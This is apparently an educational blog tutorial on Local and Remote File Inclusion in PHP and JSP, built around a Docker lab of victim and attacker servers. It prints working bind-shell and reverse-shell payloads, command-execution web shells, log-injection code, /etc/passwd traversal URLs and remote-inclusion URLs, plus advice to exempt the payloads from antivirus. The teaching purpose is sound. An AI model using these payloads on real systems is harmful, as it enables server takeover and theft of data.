# Introduction

In this blog post I want to talk about Local File Inclusion / Remote File Inclusion.
These two vulnerabilities are closely related, so I describe them here together.
Web applications that are affected by such issues can often be owned relatively quickly by malicious attackers.

In the following I will describe, 
- how these vulnerabilities are constructed
- how to set up a test environment to recreate them
- which attack scenarios there are and
- how to avoid or find these issues

I try to accompany everything with exercises so that you can understand it easier. 

Everything coded here including all docker stuff can be found at <a href="https://github.com/secf00tprint/payloadtester_lfi_rfi">my github repo</a>. 

# What is LFI / RFI in detail?

So I'm a hacker. How do I get into your application?

<img src="{{ page.image-base | prepend:site.baseurl }}howtogetin.png" alt="PHP Check accessable" width="100%">

This is essentially what LFI/RFI takes advantage of when there is a corresponding vulnerability. And the impact is most often a very critical one.

Here's a little visualization to get a better grip:

The individual steps in detail:

- First a client sends a request to the server, e.g. someone types in the URL in the browser and presses Enter.
- The server then sends back a response.
- The request URL consists of several parts, the protocol :// the domain of the server / and query parameters.
- The response can be some html code.
- The query parameters of the URL are structured by key-value pairs.
- You could try to change a value of a key ...
- ... and see what happens with the response. Does the content change?

Now the value of the request parameter is a file from the server. 

- **Local File Inclusion** is it if you could change that file to
another file that then will be loaded not intended by the application.

- **Remote File Inclusion** is it if you could change the value to an url which then would be loaded as file into the server.

## Exercises

<blockquote>
If you see the following url: {{ site.url }}?page=file.html. 
- Where could the application be vulnerable? 
- What is the name of this attack? 
- How can you try to verify it?  
</blockquote>

    See Answer
  </button>

<div class="collapse" id="exercise_lfirfi_main">
<div class="card card-body">
<p class="card-title"><em>Answer</em>   
</p>
<p class="card-text">
It seems that the application uses a key-value-pair in the url: page=file.html. 
</p>
<p class="card-text">
This key-value-pair consists a file as value.
</p>
<p class="card-text">
This indicates a local-file-inclusion vulnerability. Search another html file of the application and try to insert it at the value position.
</p>
<p class="card-text">
<br>
</p>

# Why is it so dangerous?

Possible ways after LFI/RFI has been found are shown in the next picture:

<img src="{{ page.image-base | prepend:site.baseurl }}attackvectors.png" alt="attack vectors" width="100%">

There are 3 levels of attack severity:

- 1st level: Read access LFI
- 2nd level: Write access LFI
- 3rd level: RFI

Every of the paths shown in the figure as well as the different severity types will be demonstrated in a executable demo hereafter so that you can directly reproduce the vulnerabilities to learn from it.

## Read access LFI

If LFI is possible, the attacker can read files from the server. This affects files within the current directory or even across directories. 

## Write access LFI

Does the attacker have 

1. the ability to upload files or manipulate files on the server and
2. do these files are located in an accessible LFI directory
 
then he or she can execute arbitrary code on the server. 

## RFI

If RFI is possible it's easiest to attack. The attacker has just to include the malicious code into the url and the payload will be executed onto the victim machine.

I will now demonstrate different attacks in running server examples:

# Setting up a test environment

To reproduce the two security issues local on your system you can use the following github project:
[https://github.com/secf00tprint/payloadtester_lfi_rfi](https://github.com/secf00tprint/payloadtester_lfi_rfi)

To run it you need 

- [Docker](https://www.docker.com/)
- [Git](https://git-scm.com/) and

First you have to clone the project: 

<pre><code class="bash">git clone https://github.com/secf00tprint/payloadtester_lfi_rfi
</code></pre>

There are two networks available. One is a Linux network, the other is a Windows one.

# Linux network

The understand all the Linux network you need additionally a Kali VM for creating payloads using Metasploit.

Therefore it is good if you have installed and downloaded:

- [VirtualBox](https://www.virtualbox.org/)
- [Kali VM for VirtualBox](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)

The Linux server infrastructure consists of:

<img src="{{ page.image-base | prepend:site.baseurl }}lfirfi_infrastructure.svg" alt="LFI / RFI Linux Infrastructure" width="100%">

## Starting the network

You can start the Linux network 

<pre><code class="bash">start_linux_network.sh
</code></pre>

and stop it with Ctrl-C (wait some seconds till everything is gracefully shutdown after that). 

At the beginning of the logs you can see which IPs are used inside your local network and which IPs inside
the docker network:

If we look at the beginning of our docker logs we can see:

<pre><code class="bash">Attaching to attacker.lfi.jsp.tld, attacker.lfi.php.tld, victim.lfi.jsp.tld, victim.lfi.php.tld
attacker.lfi.jsp.tld     | starting server on: external: 127.0.0.1:8882 - internal: 172.18.0.3:8080
attacker.lfi.php.tld     | starting server on: external: 127.0.0.1:8884 - internal: 172.18.0.5:80
victim.lfi.jsp.tld       | starting server on: external: 127.0.0.1:8881 - internal: 172.18.0.2:8080
victim.lfi.php.tld       | starting server on: external: 127.0.0.1:8883 - internal: 172.18.0.4:80
</code></pre>

So for example the victim php server can be reached on your local computer at [http://127.0.0.1:8883](http://127.0.0.1:8883) and 
inside the Linux docker network at [http://172.18.0.4:80](http://172.18.0.4:80) or using name resolution at [http://victim.lfi.php.tld:80](http://victim.lfi.php.tld:80).

I will now show some examples of LFI / RFI in two programming languages PHP and JSP.

First I'll start with PHP:

## PHP

If you run the Linux network you can go to  

[http://127.0.0.1:8883/lfi.php](http://127.0.0.1:8883/lfi.php)

Here we have 2 vulnerable query parameters: `language` and `page`.

I will handle both parameters, in the next section first with `language`:

### Language Parameter 

#### LFI

##### File Upload

The application allows the upload of files. Furthermore if you upload a file you can see where the file is stored:

On [http://127.0.0.1:8883/lfi.php](http://127.0.0.1:8883/lfi.php) you can choose between different languages. Everytime you switch you can see that the language is set in the url:

- [http://127.0.0.1:8883/lfi.php?language=english](http://127.0.0.1:8883/lfi.php?language=english)
- [http://127.0.0.1:8883/lfi.php?language=melay](http://127.0.0.1:8883/lfi.php?language=melay)

It seem's that the PHP code is just setting an `.php` file postfix at the end.

###### Sanity check lfi

Now, why no trying to upload a file and get it with the absolute path using the url?

There create the following file

<pre><code class="php">&#x3C;?php
  phpinfo();
</code></pre>

and upload it. After that, call [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check)

Bingo! You have currenty insight into the php configuration of the victim server!

<img src="{{ page.image-base | prepend:site.baseurl }}php_check.png" alt="PHP Check accessable" width="100%">

###### Getting a remote shell

Now that we know that we can upload a file, access and execute it, let's try bringing real malicious code to the system.

The idea would be to get direct access to the server by executing a PHP file.

Therefore we need the following code:

<pre><code class="bash">cat shell.php
</code></pre>          
<pre><code class="php">&#x3C;?php
system(&#x22;perl -e \&#x22;use Socket;socket(SOCKET, PF_INET,
SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));setsockopt(SOCKET,
SOL_SOCKET,SO_REUSEADDR, 1);bind(SOCKET,
pack_sockaddr_in(4444,inet_aton(&#x27;0.0.0.0&#x27;)));listen(SOCKET,
SOMAXCONN);for (;accept(NEW_SOCKET,SOCKET);close NEW_SOCKET){open(STDIN,
&#x27;&#x3E;&#x26;NEW_SOCKET&#x27;);open(STDOUT, &#x27;&#x3E;&#x26;NEW_SOCKET&#x27;);open(STDERR,
&#x27;&#x3E;&#x26;NEW_SOCKET&#x27;);system(&#x27;/bin/sh&#x27;);close(STDIN);close(STDOUT);close(STDERR);};\&#x22;
&#x26;&#x22;);
?&#x3E;
</code></pre>

This creates a **Bind Shell** - it opens a possible connection where you can connect to as attacker. 
The connection is open for everybody (`0.0.0.0`) and listens on port `4444`.

Upload the file on the victim server and execute it by opening it:

[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)

You should now be able to connect to the server.

Therefore: 

<ol>
<li>Get the docker id of the attacker server:<br><pre><code class="bash">docker ps -a</code></pre>
<img src="{{ page.image-base | prepend:site.baseurl }}docker_getdockerid.png" alt="Docker Get Docker ID" width="100%">
</li>
<li>Open a shell of the attacker server:<br><pre><code class="bash">docker exec -ti &#x3C;containerid_attackerserver&#x3E; /bin/bash</code></pre>
<img src="{{ page.image-base | prepend:site.baseurl }}docker_exectobash.png" alt="Docker Exec to Bash" width="100%">
</li>
<li>Open a shell from the attacker server to the victim server:<br><pre><code class="bash">nc victim.lfi.php.tld 4444</code></pre>
<img src="{{ page.image-base | prepend:site.baseurl }}docker_nctoshellphp.png" alt="Netcat to bind shell php" width="100%">
</li>
<li>You have a connection directly into the victim server!

</li>
</ol>
  
#### Log Injection

If there is no file upload to write your code to the server, you could try to do Log Injection.

This can be done the following way:

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill-opacity="1" color-rendering="auto" color-interpolation="auto" text-rendering="auto" stroke="black" stroke-linecap="square" width="603" stroke-miterlimit="10" shape-rendering="auto" stroke-opacity="1" fill="black" stroke-dasharray="none" font-weight="normal" stroke-width="1" height="234" font-family="'Dialog'" font-style="normal" stroke-linejoin="miter" font-size="12px" stroke-dashoffset="0" image-rendering="auto">

##### Getting remote code execution

Try it! Open a HTTP Connection to the victim php server and send some exploit code to use later:

<pre><code class="bash">nc -nv 127.0.0.1 8883
&#x3C;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&#x3E;
</code></pre>

The response:

<pre><code class="bash">HTTP/1.1 400 Bad Request
Date: Wed, 05 Dec 2018 12:13:38 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

&#x3C;!DOCTYPE HTML PUBLIC &#x22;-//IETF//DTD HTML 2.0//EN&#x22;&#x3E;
&#x3C;html&#x3E;&#x3C;head&#x3E;
&#x3C;title&#x3E;400 Bad Request&#x3C;/title&#x3E;
&#x3C;/head&#x3E;&#x3C;body&#x3E;
&#x3C;h1&#x3E;Bad Request&#x3C;/h1&#x3E;
&#x3C;p&#x3E;Your browser sent a request that this server could not understand.&#x3C;br /&#x3E;
&#x3C;/p&#x3E;
&#x3C;hr&#x3E;
&#x3C;address&#x3E;Apache/2.4.25 (Debian) Server at 172.18.0.4 Port 80&#x3C;/address&#x3E;
&#x3C;/body&#x3E;&#x3C;/html&#x3E;
</code></pre>

It doesn't matter because you're only interested in getting the code into the logs.

Now try to access the `access.log` where you should have just written into.

In this example the `access.log` is named `access_combined.log`.

Result: 

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log) 

opens the log file.

<img src="{{ page.image-base | prepend:site.baseurl }}php_accesslog.png" alt="PHP Access Log" width="100%">

The PHP code allows you to use the parameter `cmd` to give a shell command, which is then executed and displayed via `echo`.

So let's find out which Linux system the server is running on.

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=uname -a](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=uname%20-a)

<img src="{{ page.image-base | prepend:site.baseurl }}php_access_loginjection_uname.png" alt="PHP Access Log" width="100%">

#### RFI

##### PHP Configuration

You can use the `check.php` [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) lfi to go to the next level:

Search for `allow_url` on the site. 

One of the first findings should be:

<img src="{{ page.image-base | prepend:site.baseurl }}php_allowurl.png" alt="PHP allow url parameters" width="100%">

These 2 parameters, `allow_url_fopen` and `allow_url_include`, are set to `Off` by default.

If they are enabled they Remote File Inclusion is possible if the site has RFI security issues, otherwise 
RFI wouldn't be possible:

- `allow_url_fopen` to `On` makes it possible to open files by url in the code.
- `allow_url_include` permits the programmer to include an external url inside his code.

##### Exploiting RFI

So now you can attack with a Remote File Inclusion:

Try to get to execute `check.php`, but the file from your attacker server rather than from the victim server should be loaded 
by the victim application. 

Our attacker server has the following file: [http://127.0.0.1:8884/check.php](http://127.0.0.1:8884/check.php). 

We will set this as the value for the language key. And, we have to use the IP inside the docker network for the attacker server,
which can be picked from the docker logs:

<img src="{{ page.image-base | prepend:site.baseurl }}php_ip_attackerserver.png" alt="PHP IP attacker server" width="100%">

The first attempt could be:

[http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php](http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?)

But this won't work because the postfix '.php' is appended.

It will become: `http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php.php`

There are 2 solutions:

Either, we rename our php file to `check.php.php`, then it will work

<img src="{{ page.image-base | prepend:site.baseurl }}php_check_phpphp.png" alt="check php php" width="100%"> 

or we use a question mark at the end of our call: `http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?`

Then `http://attacker.lfi.php.tld/check.php?.php` would be called on the attacker server, which executes `check.php` and discards 
the `.php` part. 

So a possible verify attack could be:

[http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?](http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?)

or

[http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?](http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?)

which load `check.php` from the attacker server, include the code on the victim server and execute it there. 

### Page Parameter

The second of the both url parameters that is vulnerable is `page`. 

This time no file ending is automatically appended.

You can verify the vulnerability for example using [http://127.0.0.1:8883/lfi.php?page=check.php](http://127.0.0.1:8883/lfi.php?page=check.php)  
if you have already uploaded check.php:

<img src="{{ page.image-base | prepend:site.baseurl }}php_check_pageparam.png" alt="PHP Check accessable using page param" width="100%">

#### /etc/passwd

Since an extension is not appended automatically, we can now try to get files other than PHP.

So let's try to integrate `/etc/passwd`. This is possible both absolutely and relatively.

**absolutely**: 

[http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)

<img src="{{ page.image-base | prepend:site.baseurl }}php_read_etc_passwd_absolut.png" alt="PHP Read /etc/passwd absolutely" width="100%">

**relatively**:

Here you have to try out. Start with `../etc/passwd` and add further `../`.  

In this application it is three times:

[http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)

<img src="{{ page.image-base | prepend:site.baseurl }}php_read_etc_passwd_rel.png" alt="PHP Read /etc/passwd relatively" width="100%">

### Not included in demo code

The following topic is not included in the demo code: **Null Byte Injection in PHP**.

PHP treats file names similar to C strings with a zero byte as marking the end of a string. 

This allowed the automatic appending of a string to an input to be bypassed, since the null byte character indicates the end of the string and the PHP interpreter assumes that now nothing follows and discards the rest of the string.

Example `language` parameter:

Here the file extension `.php` is appended to the input. 

With the following call you could open a file `foo.txt` in the current folder:

[http://127.0.0.1:8883/lfi.php?language=foo.txt%00](http://127.0.0.1:8883/lfi.php?language=foo.txt%00)

The string complete string is `foo.txt%00.php`. Since `%00` indicates the end of the string only `foo.txt` would be stored from the php interpreter.

However, the use of zero bytes is no longer possible since [PHP version 5.3](https://secure.php.net/manual/en/security.filesystem.nullbytes.php).
So this attack isn't possible any more since then.

### Further payloads

#### msfvenom

There are a lot more payloads that are possible.

To get an idea you can use the payload generator **msfvenom**.
 
<pre><code class="bash">msfvenom -l payloads | grep -i php</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}php_payloads_msfvenom.png" alt="PHP payloads msfvenom" width="100%">

msfvenom is part of [metasploit](https://www.metasploit.com/) which is itself is integrated in the Linux Distribution [Kali](https://www.kali.org/).

### Faulty Code

The whole faulty code described in this section PHP looks like this:

<pre><code class="bash">cat victim_lfi_server_php/src/lfi.php
</code></pre>

<pre><code class="php">&#x3C;!doctype html&#x3E;
&#x3C;html&#x3E;
    &#x3C;head&#x3E;
    &#x3C;/head&#x3E;
    &#x3C;body&#x3E;
    &#x3C;?php
        if ( isset( $_GET[&#x27;language&#x27;] ) ) {
        include( $_GET[&#x27;language&#x27;] . &#x27;.php&#x27; );
        }
        if ( isset( $_GET[&#x27;page&#x27;] ) ) {
        include( $_GET[&#x27;page&#x27;]);
    }
    ?&#x3E;
    &#x3C;div&#x3E;
        &#x3C;form method=&#x22;get&#x22;&#x3E;
           Set language of page:
&#x9;&#x9;   &#x3C;select name=&#x22;language&#x22;&#x3E;
&#x9;&#x9;&#x9;  &#x3C;option value=&#x22;english&#x22;&#x3E;English&#x3C;/option&#x3E;
&#x9;&#x9;&#x9;  &#x3C;option value=&#x22;melay&#x22;&#x3E;French&#x3C;/option&#x3E;
&#x9;&#x9;   &#x3C;/select&#x3E;
&#x9;&#x9;   &#x3C;input type=&#x22;submit&#x22;&#x3E;
        &#x3C;/form&#x3E;
    &#x3C;/div&#x3E;
    &#x3C;br/&#x3E;
    &#x3C;div&#x3E;
        &#x3C;form action=&#x22;upload.php&#x22; method=&#x22;post&#x22; enctype=&#x22;multipart/form-data&#x22;&#x3E;
            Select File to upload:
            &#x3C;input type=&#x22;file&#x22; name=&#x22;fileToUpload&#x22; id=&#x22;fileToUpload&#x22;&#x3E;
            &#x3C;input type=&#x22;submit&#x22; value=&#x22;Upload File&#x22; name=&#x22;submit&#x22;&#x3E;
        &#x3C;/form&#x3E;
    &#x3C;/div&#x3E;
    &#x3C;/body&#x3E;
&#x3C;/html&#x3E;
</code></pre>

The problem here is the part where `include` commands are combined with the GET-Parameter.

As a soft developer never let the user or client control what files could be loaded.   

## JSP

Now that I've described how Local File Inclusion can take place in PHP, this section deals with Java - in particular Java Server Pages - short JSP.

The JSP application consists of a 

- File Upload and 
- a Button where you can load the introduction to the application.

You can go to it [here http://127.0.0.1:8881/webapp/](http://127.0.0.1:8881/webapp/).

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_app_view.png" alt="JSP App View" width="100%">

### LFI

#### Help Parameter

If you click on the 'Show'-Button the url will be [http://127.0.0.1:8881/webapp/?help=introduction](http://127.0.0.1:8881/webapp/?help=introduction). 
You can see a key-value-pair: `help=introduction`.

If you call 
[http://127.0.0.1:8881/webapp/introduction](http://127.0.0.1:8881/webapp/introduction), 
you will see that the included file is also directly accessible.

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_app_included_standard_file.png" alt="JSP Included standard file" width="100%">

#### Sanity check lfi

Let's upload something to verify that. 

1. Create a file with text e.g. `echo "This is test" > showme`
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_cat_testfile.png" alt="JSP Create test file" width="100%">
2. Upload the file
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_upload_testfile.png" alt="JSP Upload test file" width="100%"><br>
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_upload_testfile2.png" alt="JSP Upload test file 2" width="100%">
3. Call it up - [http://127.0.0.1:8881/webapp/showme](http://127.0.0.1:8881/webapp/showme)
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_testfile_verify.png" alt="JSP Test File Verify" width="100%">

#### Getting remote code execution 

Let's check if not only text is rendered but also code is executed.

For this we take the following example code:

<pre><code class="JSP">&#x3C;body&#x3E;
&#x9;&#x3C;h1&#x3E;Hello
&#x3C;% 
String name = request.getParameter(&#x22;name&#x22;);
if(name != null &#x26;&#x26; name.length() &#x3E; 0) {
&#x9;out.println(name);&#x9;
} else {
&#x9;out.println(&#x22;World&#x22;);&#x9;
}&#x9;
%&#x3E;&#x9;
&#x9;from a JSP!&#x3C;/h1&#x3E;
&#x3C;/body&#x3E;
</code></pre>

Save it as `helloworld.jsp`, upload it and call it with param `name` [http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor](http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor)

The result should be:

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_remotecode_helloworld.png" alt="JSP Remote Code Hello World" width="100%">

The next step is to get remote code execution on the victim server. Therefore we create some JSP code:

<pre><code class="JSP">
&#x3C;%@page import=&#x22;java.io.*&#x22;%&#x3E;
&#x3C;%@page import=&#x22;java.util.*&#x22;%&#x3E;
&#x3C;%
  String cmd = request.getParameter(&#x22;exec&#x22;);
  if (cmd != null)
  {
      Process p;
      p = Runtime.getRuntime().exec(cmd);
      InputStreamReader isr = new InputStreamReader(p.getInputStream());
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while((line = br.readLine()) != null){
        out.println(line);
      }
  }
%&#x3E;
</code></pre>
  
This is the same as the Hello-World-Example before, we have a param which is given to the code. 

The difference is in our Hello-World-Example this param is only delivered and printed out.

Here, the param is executed as shell command and the result is rendered into the HTML.

Let's check this! Upload the code as `runme.jsp`:

[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_final_rce.png" alt="JSP Final Remote Code Execution" width="100%">

#### /etc/passwd

With Remote Code Execution at hand we can also read sensible data. Let's have a look at the `/etc/passwd`:

[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
 
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_etcpasswd.png" alt="JSP Final Remote Code Execution" width="100%">

#### Reverse Shell

We will now create a JSP reverse shell code.

For a reverse shell you have to set the IP to which the code has to connect if it is called. This can be the IP of the JSP attacker server, which you can see from the docker logs:

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_ip_attackerserver.png" alt="JSP Final Remote Code Execution" width="100%">

The following code is generated with [msfvenom](#msfvenom). 

You can use Kali if you have installed a Kali VM
or have the OS at your hands otherwise.

Be aware, the generated code can be detected and classified by Anti Virus Systems as malware.
So if this is the case for you and you have the possibility set an exception for 
- the path where you save the code and 
- for the `victim_lfi_server_jsp/webapp` directory, where the code will be uploaded onto the victim server.

First look what payloads msfvenom has for you:

<pre><code class="bash">msfvenom -l payloads | grep -i jsp</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_msfvenom.png" alt="JSP msfvenom" width="100%">

Then create the reverse shell payload:

<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp lhost=172.18.0.3 lport=4444</code></pre>

<pre><code class="JSP">&#x3C;%@page import=&#x22;java.lang.*&#x22;%&#x3E;
&#x3C;%@page import=&#x22;java.util.*&#x22;%&#x3E;
&#x3C;%@page import=&#x22;java.io.*&#x22;%&#x3E;
&#x3C;%@page import=&#x22;java.net.*&#x22;%&#x3E;

&#x3C;%
 class StreamConnector extends Thread
 {
   InputStream ib;
   OutputStream ti;

   StreamConnector( InputStream ib, OutputStream ti )
   {
     this.ib = ib;
     this.ti = ti;
   }

   public void run()
   {
     BufferedReader bt  = null;
     BufferedWriter irs = null;
     try
     {
       bt  = new BufferedReader( new InputStreamReader( this.ib ) );
       irs = new BufferedWriter( new OutputStreamWriter( this.ti ) );
       char buffer[] = new char[8192];
       int length;
       while( ( length = bt.read( buffer, 0, buffer.length ) ) &#x3E; 0 )
       {
         irs.write( buffer, 0, length );
         irs.flush();
       }
     } catch( Exception e ){}
     try
     {
       if( bt != null )
         bt.close();
       if( irs != null )
         irs.close();
     } catch( Exception e ){}
   }
 }

 try
 {
   String ShellPath;
if (System.getProperty(&#x22;os.name&#x22;).toLowerCase().indexOf(&#x22;windows&#x22;) == -1) {
 ShellPath = new String(&#x22;/bin/sh&#x22;);
} else {
 ShellPath = new String(&#x22;cmd.exe&#x22;);
}

   Socket socket = new Socket( &#x22;172.18.0.2&#x22;, 4444 );
   Process process = Runtime.getRuntime().exec( ShellPath );
   ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
   ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
 } catch( Exception e ) {}
%&#x3E;
</code></pre>

If you upload the code as `reverseshell.jsp`, 
- go into the jsp attacker server (using its docker id which you get with `docker ps -a` and do a `docker exec -ti <container_id> /bin/bash`)
- set up a netcat listener on port 4444: `nc -nlvp 4444`

You can now connect to the victim server calling in the browser
 
[http://127.0.0.1:8881/webapp/?help=reverseshell.jsp](http://127.0.0.1:8881/webapp/?help=reverseshell.jsp)

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_reverseshell.png" alt="JSP Reverse Shell" width="100%">
 
### RFI

The JSP application is also vulnerable to Remote File Inclusion.

Go into the attacker server webapp folder and create a file called `thiscomesfromhaxxor`:

<pre><code class="bash">cd attacker_server_jsp/webapp/
</code></pre>

<pre><code class="bash">echo &#x22;Unfortunately, RFI on your server is possible&#x22; &#x3E; thiscomesfromhaxxor
</code></pre>

Now call in the browser:

[http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
  
Result:

<img src="{{ page.image-base | prepend:site.baseurl }}jsp_rfi.png" alt="JSP RFI" width="100%">

### Faulty Code

The JSP code with the security vulnerabilities looks like that:

<pre><code class="JSP">cat index.jsp</code></pre>
<pre><code class="JSP">&#x3C;!doctype html&#x3E;
&#x3C;head&#x3E;
   &#x3C;%@ taglib uri = &#x22;http://java.sun.com/jsp/jstl/core&#x22; prefix = &#x22;c&#x22; %&#x3E;
   &#x3C;title&#x3E;File Upload Form&#x3C;/title&#x3E;
&#x3C;/head&#x3E;
&#x3C;h3&#x3E;File Upload&#x3C;/h3&#x3E;
Select a file to upload: &#x3C;br&#x3E;
&#x3C;br&#x3E;

&#x3C;form action = &#x22;UploadFile.jsp&#x22; method = &#x22;post&#x22; enctype = &#x22;multipart/form-data&#x22;&#x3E;
   &#x3C;input type = &#x22;file&#x22; name = &#x22;file&#x22; size = &#x22;50&#x22; /&#x3E;
   &#x3C;br /&#x3E;
   &#x3C;input type = &#x22;submit&#x22; value = &#x22;Upload File&#x22; /&#x3E;
&#x3C;/form&#x3E;

&#x3C;br&#x3E;
&#x3C;br&#x3E;

&#x3C;h3&#x3E;Introduction&#x3C;/h3&#x3E;

   &#x3C;input type=&#x22;hidden&#x22; name=&#x22;help&#x22; value=&#x22;introduction&#x22;&#x3E;
   &#x3C;input type = &#x22;submit&#x22; value = &#x22;Show&#x22; /&#x3E;
&#x3C;/form&#x3E;


&#x3C;c:if test=&#x22;${not empty param.help}&#x22;&#x3E;
   &#x3C;pre&#x3E;&#x3C;c:import    url = &#x22;&#x3C;%= request.getParameter(\&#x22;help\&#x22;)%&#x3E;&#x22;/&#x3E; &#x3C;/pre&#x3E;

The problematic part is the section where `c:import` is combined with `request.getParameter`.

</div>
</div>

</div>

<blockquote>
You want to attack `victim.lfi.jsp.tld`: Execute a bind shell there and connect to the server. How can you reach that?
</blockquote>

<p>
  <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-toggle="collapse" data-target="#exercise_jsp_lfi" aria-expanded="false" aria-controls="collapseExample">
    See Answer
  </button>
</p>

<div class="collapse" id="exercise_jsp_lfi">
<div class="card">
<div class="card-body">
<p class="card-title">Answer
</p>
<p class="card-text">
The attack would be: Create bind shell code. This can be done using metasploit:
</p>
<p class="card-text">
`msfvenom -p java/jsp_shell_bind_tcp` 
</p> 
<p class="card-text">
The generated code contains the port:
`ServerSocket server_socket = new ServerSocket( 4444 );` 
The server will listen at port 4444.
</p>
<p class="card-text">
Save the code as `bindshell.jsp`. Upload it to [http://127.0.0.1:8881/webapp/](http://127.0.0.1:8881/webapp/) and call [http://127.0.0.1:8881/webapp/?help=bindshell.jsp](http://127.0.0.1:8881/webapp/?help=bindshell.jsp). 
</p>
<p class="card-text">
You can now connect to the server: Do a `docker exec -ti <container_id_attacker_server_jsp> /bin/bash` and call `nc victim.lfi.jsp.tld 4444`.
<img src="{{ page.image-base | prepend:site.baseurl }}jsp_docker_bindshell.png" alt="JSP Docker Bind Shell" width="100%">
</p>
</div>
</div>

# Windows network

In this chapter I will talk about the Windows network.

The server infrastructure looks like:

<img src="{{ page.image-base | prepend:site.baseurl }}lfirfi_infrastructure_win.svg" alt="LFI / RFI Win Infrastructure" width="100%">
<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack">Kameleon Free Pack</a></p>

## Configuration on a Linux system

If you are on a native Windows operating system you can skip this chapter an go to the next chapter.

Otherwise, I'll explain here how you can get the Windows Docker network to run on Linux.

To start you need: 

- [VirtualBox](https://www.virtualbox.org/) 

After you have installed VirtualBox you can use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine).
This is a [vagrant](https://www.vagrantup.com/) environment using VirtualBox to let you command windows docker from a Linux system.

To install and run it, do:

<pre><code class="bash">git clone https://github.com/StefanScherer/packer-windows
cd packer-windows
packer build --only=virtualbox-iso windows_2016_docker.json
vagrant box add windows_2016_docker windows_2016_docker_virtualbox.box
cd ..

git clone https://github.com/StefanScherer/windows-docker-machine
cd windows-docker-machine
mv ../packer-windows/windows_2016_docker_virtualbox.box .
vagrant provision
</code></pre>

To start the vagrant environment execute in the windows-docker-machine folder

<pre><code class="bash">vagrant up --provider virtualbox 2016
</code></pre>

, to suspend the environment until the next session execute:

<pre><code class="bash">vagrant suspend</code></pre>

If you have started it and everything worked fine, you should see a new docker-machine `2016`:

<pre><code class="bash">docker-machine ls</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}docker_windows_dm_ls.png" alt="Docker Windows docker-machine ls" width="100%">

Then, to switch between Windows and Linux Docker, enter:

To Windows:

<pre><code class="bash">eval $(docker-machine env 2016)</code></pre>

To Linux:

<pre><code class="bash">eval $(docker-machine env -unset)</code></pre>

Set a environment variable which remembers the IP of your VirtualBox:

<pre><code class="bash">export DOCKER_VM_IP=$(docker-machine ip 2016)</code></pre>

After that you should be able to start the windows network.

## Configuration on a Windows system

On a windows system set the following environment variable:

<pre><code class="bash">set DOCKER_VM_IP=127.0.0.1</code></pre>

## Starting the network

To start the windows network check that you have a windows docker:

<pre><code class="bash">docker version</code></pre>

Verify in the answer: 

<pre><code class="bash">OS/Arch: windows</code></pre>

then type in:

<pre><code class="bash">./start_win_network.sh</code></pre>

To stop the network with Ctrl-C. Please note that it needs some time to gracefully shut down.

